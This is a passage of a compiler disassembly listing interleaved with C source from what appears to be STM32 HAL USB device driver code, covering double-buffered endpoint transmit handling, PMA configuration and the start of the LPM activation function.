    if (ep->xfer_len == 0U)
 8003544:	68bb      	ldr	r3, [r7, #8]
 8003546:	699b      	ldr	r3, [r3, #24]
 8003548:	2b00      	cmp	r3, #0
 800354a:	f040 80c0 	bne.w	80036ce <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 800354e:	68bb      	ldr	r3, [r7, #8]
 8003550:	785b      	ldrb	r3, [r3, #1]
 8003552:	2b00      	cmp	r3, #0
 8003554:	d126      	bne.n	80035a4 <HAL_PCD_EP_DB_Transmit+0x47a>
 8003556:	68fb      	ldr	r3, [r7, #12]
 8003558:	681b      	ldr	r3, [r3, #0]
 800355a:	67fb      	str	r3, [r7, #124]	; 0x7c
 800355c:	68fb      	ldr	r3, [r7, #12]
 800355e:	681b      	ldr	r3, [r3, #0]
 8003560:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003564:	b29b      	uxth	r3, r3
 8003566:	461a      	mov	r2, r3
 8003568:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800356a:	4413      	add	r3, r2
 800356c:	67fb      	str	r3, [r7, #124]	; 0x7c
 800356e:	68bb      	ldr	r3, [r7, #8]
 8003570:	781b      	ldrb	r3, [r3, #0]
 8003572:	00da      	lsls	r2, r3, #3
 8003574:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003576:	4413      	add	r3, r2
 8003578:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800357c:	67bb      	str	r3, [r7, #120]	; 0x78
 800357e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003580:	881b      	ldrh	r3, [r3, #0]
 8003582:	b29b      	uxth	r3, r3
 8003584:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003588:	b29a      	uxth	r2, r3
 800358a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800358c:	801a      	strh	r2, [r3, #0]
 800358e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003590:	881b      	ldrh	r3, [r3, #0]
 8003592:	b29b      	uxth	r3, r3
 8003594:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003598:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800359c:	b29a      	uxth	r2, r3
 800359e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80035a0:	801a      	strh	r2, [r3, #0]
 80035a2:	e01a      	b.n	80035da <HAL_PCD_EP_DB_Transmit+0x4b0>
 80035a4:	68bb      	ldr	r3, [r7, #8]
 80035a6:	785b      	ldrb	r3, [r3, #1]
 80035a8:	2b01      	cmp	r3, #1
 80035aa:	d116      	bne.n	80035da <HAL_PCD_EP_DB_Transmit+0x4b0>
 80035ac:	68fb      	ldr	r3, [r7, #12]
 80035ae:	681b      	ldr	r3, [r3, #0]
 80035b0:	667b      	str	r3, [r7, #100]	; 0x64
 80035b2:	68fb      	ldr	r3, [r7, #12]
 80035b4:	681b      	ldr	r3, [r3, #0]
 80035b6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035ba:	b29b      	uxth	r3, r3
 80035bc:	461a      	mov	r2, r3
 80035be:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80035c0:	4413      	add	r3, r2
 80035c2:	667b      	str	r3, [r7, #100]	; 0x64
 80035c4:	68bb      	ldr	r3, [r7, #8]
 80035c6:	781b      	ldrb	r3, [r3, #0]
 80035c8:	00da      	lsls	r2, r3, #3
 80035ca:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80035cc:	4413      	add	r3, r2
 80035ce:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80035d2:	663b      	str	r3, [r7, #96]	; 0x60
 80035d4:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80035d6:	2200      	movs	r2, #0
 80035d8:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80035da:	68fb      	ldr	r3, [r7, #12]
 80035dc:	681b      	ldr	r3, [r3, #0]
 80035de:	677b      	str	r3, [r7, #116]	; 0x74
 80035e0:	68bb      	ldr	r3, [r7, #8]
 80035e2:	785b      	ldrb	r3, [r3, #1]
 80035e4:	2b00      	cmp	r3, #0
 80035e6:	d12b      	bne.n	8003640 <HAL_PCD_EP_DB_Transmit+0x516>
 80035e8:	68fb      	ldr	r3, [r7, #12]
 80035ea:	681b      	ldr	r3, [r3, #0]
 80035ec:	66fb      	str	r3, [r7, #108]	; 0x6c
 80035ee:	68fb      	ldr	r3, [r7, #12]
 80035f0:	681b      	ldr	r3, [r3, #0]
 80035f2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035f6:	b29b      	uxth	r3, r3
 80035f8:	461a      	mov	r2, r3
 80035fa:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80035fc:	4413      	add	r3, r2
 80035fe:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003600:	68bb      	ldr	r3, [r7, #8]
 8003602:	781b      	ldrb	r3, [r3, #0]
 8003604:	00da      	lsls	r2, r3, #3
 8003606:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003608:	4413      	add	r3, r2
 800360a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800360e:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8003612:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003616:	881b      	ldrh	r3, [r3, #0]
 8003618:	b29b      	uxth	r3, r3
 800361a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800361e:	b29a      	uxth	r2, r3
 8003620:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003624:	801a      	strh	r2, [r3, #0]
 8003626:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800362a:	881b      	ldrh	r3, [r3, #0]
 800362c:	b29b      	uxth	r3, r3
 800362e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003632:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003636:	b29a      	uxth	r2, r3
 8003638:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800363c:	801a      	strh	r2, [r3, #0]
 800363e:	e017      	b.n	8003670 <HAL_PCD_EP_DB_Transmit+0x546>
 8003640:	68bb      	ldr	r3, [r7, #8]
 8003642:	785b      	ldrb	r3, [r3, #1]
 8003644:	2b01      	cmp	r3, #1
 8003646:	d113      	bne.n	8003670 <HAL_PCD_EP_DB_Transmit+0x546>
 8003648:	68fb      	ldr	r3, [r7, #12]
 800364a:	681b      	ldr	r3, [r3, #0]
 800364c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003650:	b29b      	uxth	r3, r3
 8003652:	461a      	mov	r2, r3
 8003654:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 8003656:	4413      	add	r3, r2
 8003658:	677b      	str	r3, [r7, #116]	; 0x74
 800365a:	68bb      	ldr	r3, [r7, #8]
 800365c:	781b      	ldrb	r3, [r3, #0]
 800365e:	00da      	lsls	r2, r3, #3
 8003660:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 8003662:	4413      	add	r3, r2
 8003664:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003668:	673b      	str	r3, [r7, #112]	; 0x70
 800366a:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800366c:	2200      	movs	r2, #0
 800366e:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003670:	68bb      	ldr	r3, [r7, #8]
 8003672:	781b      	ldrb	r3, [r3, #0]
 8003674:	4619      	mov	r1, r3
 8003676:	68f8      	ldr	r0, [r7, #12]
 8003678:	f009 fa69 	bl	800cb4e <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 800367c:	88fb      	ldrh	r3, [r7, #6]
 800367e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003682:	2b00      	cmp	r3, #0
 8003684:	f040 811a 	bne.w	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003688:	68fb      	ldr	r3, [r7, #12]
 800368a:	681b      	ldr	r3, [r3, #0]
 800368c:	461a      	mov	r2, r3
 800368e:	68bb      	ldr	r3, [r7, #8]
 8003690:	781b      	ldrb	r3, [r3, #0]
 8003692:	009b      	lsls	r3, r3, #2
 8003694:	4413      	add	r3, r2
 8003696:	881b      	ldrh	r3, [r3, #0]
 8003698:	b29b      	uxth	r3, r3
 800369a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800369e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80036a2:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 80036a6:	68fb      	ldr	r3, [r7, #12]
 80036a8:	681b      	ldr	r3, [r3, #0]
 80036aa:	461a      	mov	r2, r3
 80036ac:	68bb      	ldr	r3, [r7, #8]
 80036ae:	781b      	ldrb	r3, [r3, #0]
 80036b0:	009b      	lsls	r3, r3, #2
 80036b2:	441a      	add	r2, r3
 80036b4:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 80036b8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80036bc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80036c0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80036c4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80036c8:	b29b      	uxth	r3, r3
 80036ca:	8013      	strh	r3, [r2, #0]
 80036cc:	e0f6      	b.n	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 80036ce:	88fb      	ldrh	r3, [r7, #6]
 80036d0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80036d4:	2b00      	cmp	r3, #0
 80036d6:	d121      	bne.n	800371c <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80036d8:	68fb      	ldr	r3, [r7, #12]
 80036da:	681b      	ldr	r3, [r3, #0]
 80036dc:	461a      	mov	r2, r3
 80036de:	68bb      	ldr	r3, [r7, #8]
 80036e0:	781b      	ldrb	r3, [r3, #0]
 80036e2:	009b      	lsls	r3, r3, #2
 80036e4:	4413      	add	r3, r2
 80036e6:	881b      	ldrh	r3, [r3, #0]
 80036e8:	b29b      	uxth	r3, r3
 80036ea:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80036ee:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80036f2:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80036f6:	68fb      	ldr	r3, [r7, #12]
 80036f8:	681b      	ldr	r3, [r3, #0]
 80036fa:	461a      	mov	r2, r3
 80036fc:	68bb      	ldr	r3, [r7, #8]
 80036fe:	781b      	ldrb	r3, [r3, #0]
 8003700:	009b      	lsls	r3, r3, #2
 8003702:	441a      	add	r2, r3
 8003704:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003708:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800370c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003710:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003714:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003718:	b29b      	uxth	r3, r3
 800371a:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 800371c:	68bb      	ldr	r3, [r7, #8]
 800371e:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003722:	2b01      	cmp	r3, #1
 8003724:	f040 80ca 	bne.w	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003728:	68bb      	ldr	r3, [r7, #8]
 800372a:	695a      	ldr	r2, [r3, #20]
 800372c:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003730:	441a      	add	r2, r3
 8003732:	68bb      	ldr	r3, [r7, #8]
 8003734:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 8003736:	68bb      	ldr	r3, [r7, #8]
 8003738:	69da      	ldr	r2, [r3, #28]
 800373a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800373e:	441a      	add	r2, r3
 8003740:	68bb      	ldr	r3, [r7, #8]
 8003742:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003744:	68bb      	ldr	r3, [r7, #8]
 8003746:	6a1a      	ldr	r2, [r3, #32]
 8003748:	68bb      	ldr	r3, [r7, #8]
 800374a:	691b      	ldr	r3, [r3, #16]
 800374c:	429a      	cmp	r2, r3
 800374e:	d30b      	bcc.n	8003768 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003750:	68bb      	ldr	r3, [r7, #8]
 8003752:	691b      	ldr	r3, [r3, #16]
 8003754:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003758:	68bb      	ldr	r3, [r7, #8]
 800375a:	6a1a      	ldr	r2, [r3, #32]
 800375c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003760:	1ad2      	subs	r2, r2, r3
 8003762:	68bb      	ldr	r3, [r7, #8]
 8003764:	621a      	str	r2, [r3, #32]
 8003766:	e017      	b.n	8003798 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 8003768:	68bb      	ldr	r3, [r7, #8]
 800376a:	6a1b      	ldr	r3, [r3, #32]
 800376c:	2b00      	cmp	r3, #0
 800376e:	d108      	bne.n	8003782 <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003770:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003774:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003778:	68bb      	ldr	r3, [r7, #8]
 800377a:	2200      	movs	r2, #0
 800377c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003780:	e00a      	b.n	8003798 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 8003782:	68bb      	ldr	r3, [r7, #8]
 8003784:	6a1b      	ldr	r3, [r3, #32]
 8003786:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800378a:	68bb      	ldr	r3, [r7, #8]
 800378c:	2200      	movs	r2, #0
 800378e:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 8003790:	68bb      	ldr	r3, [r7, #8]
 8003792:	2200      	movs	r2, #0
 8003794:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003798:	68fb      	ldr	r3, [r7, #12]
 800379a:	681b      	ldr	r3, [r3, #0]
 800379c:	657b      	str	r3, [r7, #84]	; 0x54
 800379e:	68bb      	ldr	r3, [r7, #8]
 80037a0:	785b      	ldrb	r3, [r3, #1]
 80037a2:	2b00      	cmp	r3, #0
 80037a4:	d165      	bne.n	8003872 <HAL_PCD_EP_DB_Transmit+0x748>
 80037a6:	68fb      	ldr	r3, [r7, #12]
 80037a8:	681b      	ldr	r3, [r3, #0]
 80037aa:	65fb      	str	r3, [r7, #92]	; 0x5c
 80037ac:	68fb      	ldr	r3, [r7, #12]
 80037ae:	681b      	ldr	r3, [r3, #0]
 80037b0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80037b4:	b29b      	uxth	r3, r3
 80037b6:	461a      	mov	r2, r3
 80037b8:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80037ba:	4413      	add	r3, r2
 80037bc:	65fb      	str	r3, [r7, #92]	; 0x5c
 80037be:	68bb      	ldr	r3, [r7, #8]
 80037c0:	781b      	ldrb	r3, [r3, #0]
 80037c2:	00da      	lsls	r2, r3, #3
 80037c4:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80037c6:	4413      	add	r3, r2
 80037c8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80037cc:	65bb      	str	r3, [r7, #88]	; 0x58
 80037ce:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037d0:	881b      	ldrh	r3, [r3, #0]
 80037d2:	b29b      	uxth	r3, r3
 80037d4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80037d8:	b29a      	uxth	r2, r3
 80037da:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037dc:	801a      	strh	r2, [r3, #0]
 80037de:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037e2:	2b3e      	cmp	r3, #62	; 0x3e
 80037e4:	d91d      	bls.n	8003822 <HAL_PCD_EP_DB_Transmit+0x6f8>
 80037e6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037ea:	095b      	lsrs	r3, r3, #5
 80037ec:	66bb      	str	r3, [r7, #104]	; 0x68
 80037ee:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037f2:	f003 031f 	and.w	r3, r3, #31
 80037f6:	2b00      	cmp	r3, #0
 80037f8:	d102      	bne.n	8003800 <HAL_PCD_EP_DB_Transmit+0x6d6>
 80037fa:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80037fc:	3b01      	subs	r3, #1
 80037fe:	66bb      	str	r3, [r7, #104]	; 0x68
 8003800:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003802:	881b      	ldrh	r3, [r3, #0]
 8003804:	b29a      	uxth	r2, r3
 8003806:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003808:	b29b      	uxth	r3, r3
 800380a:	029b      	lsls	r3, r3, #10
 800380c:	b29b      	uxth	r3, r3
 800380e:	4313      	orrs	r3, r2
 8003810:	b29b      	uxth	r3, r3
 8003812:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003816:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800381a:	b29a      	uxth	r2, r3
 800381c:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800381e:	801a      	strh	r2, [r3, #0]
 8003820:	e041      	b.n	80038a6 <HAL_PCD_EP_DB_Transmit+0x77c>
 8003822:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003826:	2b00      	cmp	r3, #0
 8003828:	d10a      	bne.n	8003840 <HAL_PCD_EP_DB_Transmit+0x716>
 800382a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800382c:	881b      	ldrh	r3, [r3, #0]
 800382e:	b29b      	uxth	r3, r3
 8003830:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003834:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003838:	b29a      	uxth	r2, r3
 800383a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800383c:	801a      	strh	r2, [r3, #0]
 800383e:	e032      	b.n	80038a6 <HAL_PCD_EP_DB_Transmit+0x77c>
 8003840:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003844:	085b      	lsrs	r3, r3, #1
 8003846:	66bb      	str	r3, [r7, #104]	; 0x68
 8003848:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800384c:	f003 0301 	and.w	r3, r3, #1
 8003850:	2b00      	cmp	r3, #0
 8003852:	d002      	beq.n	800385a <HAL_PCD_EP_DB_Transmit+0x730>
 8003854:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003856:	3301      	adds	r3, #1
 8003858:	66bb      	str	r3, [r7, #104]	; 0x68
 800385a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800385c:	881b      	ldrh	r3, [r3, #0]
 800385e:	b29a      	uxth	r2, r3
 8003860:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003862:	b29b      	uxth	r3, r3
 8003864:	029b      	lsls	r3, r3, #10
 8003866:	b29b      	uxth	r3, r3
 8003868:	4313      	orrs	r3, r2
 800386a:	b29a      	uxth	r2, r3
 800386c:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800386e:	801a      	strh	r2, [r3, #0]
 8003870:	e019      	b.n	80038a6 <HAL_PCD_EP_DB_Transmit+0x77c>
 8003872:	68bb      	ldr	r3, [r7, #8]
 8003874:	785b      	ldrb	r3, [r3, #1]
 8003876:	2b01      	cmp	r3, #1
 8003878:	d115      	bne.n	80038a6 <HAL_PCD_EP_DB_Transmit+0x77c>
 800387a:	68fb      	ldr	r3, [r7, #12]
 800387c:	681b      	ldr	r3, [r3, #0]
 800387e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003882:	b29b      	uxth	r3, r3
 8003884:	461a      	mov	r2, r3
 8003886:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003888:	4413      	add	r3, r2
 800388a:	657b      	str	r3, [r7, #84]	; 0x54
 800388c:	68bb      	ldr	r3, [r7, #8]
 800388e:	781b      	ldrb	r3, [r3, #0]
 8003890:	00da      	lsls	r2, r3, #3
 8003892:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003894:	4413      	add	r3, r2
 8003896:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800389a:	653b      	str	r3, [r7, #80]	; 0x50
 800389c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80038a0:	b29a      	uxth	r2, r3
 80038a2:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80038a4:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 80038a6:	68fb      	ldr	r3, [r7, #12]
 80038a8:	6818      	ldr	r0, [r3, #0]
 80038aa:	68bb      	ldr	r3, [r7, #8]
 80038ac:	6959      	ldr	r1, [r3, #20]
 80038ae:	68bb      	ldr	r3, [r7, #8]
 80038b0:	895a      	ldrh	r2, [r3, #10]
 80038b2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80038b6:	b29b      	uxth	r3, r3
 80038b8:	f004 fee7 	bl	800868a <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 80038bc:	68fb      	ldr	r3, [r7, #12]
 80038be:	681b      	ldr	r3, [r3, #0]
 80038c0:	461a      	mov	r2, r3
 80038c2:	68bb      	ldr	r3, [r7, #8]
 80038c4:	781b      	ldrb	r3, [r3, #0]
 80038c6:	009b      	lsls	r3, r3, #2
 80038c8:	4413      	add	r3, r2
 80038ca:	881b      	ldrh	r3, [r3, #0]
 80038cc:	b29b      	uxth	r3, r3
 80038ce:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80038d2:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80038d6:	82bb      	strh	r3, [r7, #20]
 80038d8:	8abb      	ldrh	r3, [r7, #20]
 80038da:	f083 0310 	eor.w	r3, r3, #16
 80038de:	82bb      	strh	r3, [r7, #20]
 80038e0:	8abb      	ldrh	r3, [r7, #20]
 80038e2:	f083 0320 	eor.w	r3, r3, #32
 80038e6:	82bb      	strh	r3, [r7, #20]
 80038e8:	68fb      	ldr	r3, [r7, #12]
 80038ea:	681b      	ldr	r3, [r3, #0]
 80038ec:	461a      	mov	r2, r3
 80038ee:	68bb      	ldr	r3, [r7, #8]
 80038f0:	781b      	ldrb	r3, [r3, #0]
 80038f2:	009b      	lsls	r3, r3, #2
 80038f4:	441a      	add	r2, r3
 80038f6:	8abb      	ldrh	r3, [r7, #20]
 80038f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80038fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003900:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003904:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003908:	b29b      	uxth	r3, r3
 800390a:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 800390c:	2300      	movs	r3, #0
}
 800390e:	4618      	mov	r0, r3
 8003910:	3790      	adds	r7, #144	; 0x90
 8003912:	46bd      	mov	sp, r7
 8003914:	bd80      	pop	{r7, pc}

08003916 <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 8003916:	b480      	push	{r7}
 8003918:	b087      	sub	sp, #28
 800391a:	af00      	add	r7, sp, #0
 800391c:	60f8      	str	r0, [r7, #12]
 800391e:	607b      	str	r3, [r7, #4]
 8003920:	460b      	mov	r3, r1
 8003922:	817b      	strh	r3, [r7, #10]
 8003924:	4613      	mov	r3, r2
 8003926:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 8003928:	897b      	ldrh	r3, [r7, #10]
 800392a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 800392e:	b29b      	uxth	r3, r3
 8003930:	2b00      	cmp	r3, #0
 8003932:	d00b      	beq.n	800394c <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8003934:	897b      	ldrh	r3, [r7, #10]
 8003936:	f003 0307 	and.w	r3, r3, #7
 800393a:	1c5a      	adds	r2, r3, #1
 800393c:	4613      	mov	r3, r2
 800393e:	009b      	lsls	r3, r3, #2
 8003940:	4413      	add	r3, r2
 8003942:	00db      	lsls	r3, r3, #3
 8003944:	68fa      	ldr	r2, [r7, #12]
 8003946:	4413      	add	r3, r2
 8003948:	617b      	str	r3, [r7, #20]
 800394a:	e009      	b.n	8003960 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 800394c:	897a      	ldrh	r2, [r7, #10]
 800394e:	4613      	mov	r3, r2
 8003950:	009b      	lsls	r3, r3, #2
 8003952:	4413      	add	r3, r2
 8003954:	00db      	lsls	r3, r3, #3
 8003956:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800395a:	68fa      	ldr	r2, [r7, #12]
 800395c:	4413      	add	r3, r2
 800395e:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 8003960:	893b      	ldrh	r3, [r7, #8]
 8003962:	2b00      	cmp	r3, #0
 8003964:	d107      	bne.n	8003976 <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 8003966:	697b      	ldr	r3, [r7, #20]
 8003968:	2200      	movs	r2, #0
 800396a:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 800396c:	687b      	ldr	r3, [r7, #4]
 800396e:	b29a      	uxth	r2, r3
 8003970:	697b      	ldr	r3, [r7, #20]
 8003972:	80da      	strh	r2, [r3, #6]
 8003974:	e00b      	b.n	800398e <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 8003976:	697b      	ldr	r3, [r7, #20]
 8003978:	2201      	movs	r2, #1
 800397a:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 800397c:	687b      	ldr	r3, [r7, #4]
 800397e:	b29a      	uxth	r2, r3
 8003980:	697b      	ldr	r3, [r7, #20]
 8003982:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 8003984:	687b      	ldr	r3, [r7, #4]
 8003986:	0c1b      	lsrs	r3, r3, #16
 8003988:	b29a      	uxth	r2, r3
 800398a:	697b      	ldr	r3, [r7, #20]
 800398c:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 800398e:	2300      	movs	r3, #0
}
 8003990:	4618      	mov	r0, r3
 8003992:	371c      	adds	r7, #28
 8003994:	46bd      	mov	sp, r7
 8003996:	f85d 7b04 	ldr.w	r7, [sp], #4
 800399a:	4770      	bx	lr

0800399c <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 800399c:	b480      	push	{r7}
 800399e:	b085      	sub	sp, #20
 80039a0:	af00      	add	r7, sp, #0
 80039a2:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 80039a4:	687b      	ldr	r3, [r7, #4]
 80039a6:	681b      	ldr	r3, [r3, #0]
 80039a8:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 80039aa:	687b      	ldr	r3, [r7, #4]
